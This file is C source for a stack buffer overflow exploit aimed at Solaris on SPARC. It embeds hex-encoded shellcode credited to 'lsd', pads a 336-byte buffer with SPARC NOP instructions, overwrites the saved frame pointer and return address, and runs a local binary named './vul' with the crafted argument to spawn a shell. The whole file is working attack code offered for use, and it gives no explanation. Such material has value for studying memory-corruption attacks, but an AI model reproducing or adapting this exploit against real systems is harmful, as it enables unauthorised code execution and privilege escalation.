//#include 

/* lsd - Solaris shellcode 
 */
static char shell[]=         /* 10*4+8 bytes */
"\x21\x12\x19\x5b\xa0\x14\x20\x6c\x23\x1b\xcb\x08\xa2\x14\x60\x57\x25\x1b\xdc\x9b\xa4\x14\xa0\x64\x27\x08\x42\x80\x90\x10\x20\x01\x92\x0b\x80\x0e\x94\x10\x20\x0e\x82\x10\x24\x04\x84\x03\xe0\x08\x91\xd0\x20\x08\x82\x10\x24\x01";

#define BUFSIZE 336

/* SPARC NOP
 */
static char np[] = "\xac\x15\xa1\x6e";


unsigned long get_sp( void ) {
        __asm__("or %sp,%sp,%i0");
}


main( int argc, char *argv[] ) {

        char buf[ BUFSIZE ],*ptr;
        unsigned long ret,sp;
        int rem,i,err;

        ret = sp = get_sp();

        if( argv[1] ) {
                ret -= strtoul( argv[1], (void *)0, 16 );
        }

        /* align return address */
   
        if( ( rem = ret % 4 ) ) {
                ret &= ~(rem);
        }
        
        bzero( buf, BUFSIZE );
        for( i = 0; i < BUFSIZE; i+=4 ) {
                strcpy( &buf[i], np );
        }

        memcpy( (buf + BUFSIZE - strlen( shell ) - 8),shell,strlen( shell ));

        ptr = &buf[328];
         
        /* set fp to a save stack value
         */
        *( ptr++ ) = ( sp >> 24 ) & 0xff;
        *( ptr++ ) = ( sp >> 16 ) & 0xff;
        *( ptr++ ) = ( sp >> 8 ) & 0xff;
        *( ptr++ ) = ( sp ) & 0xff;


        /* we now overwrite saved PC
         */
        *( ptr++ ) = ( ret >> 24 ) & 0xff;
        *( ptr++ ) = ( ret >> 16 ) & 0xff;
        *( ptr++ ) = ( ret >> 8 ) & 0xff;
        *( ptr++ ) = ( ret ) & 0xff;
		
        buf[ BUFSIZE -1 ] = 0;

#ifndef QUIET
        printf("Return Address 0x%x\n",ret);
#endif
        		
        err = execl( "./vul", "vul", buf, ( void *)0 );
        if( err == -1 ) perror("execl");
}
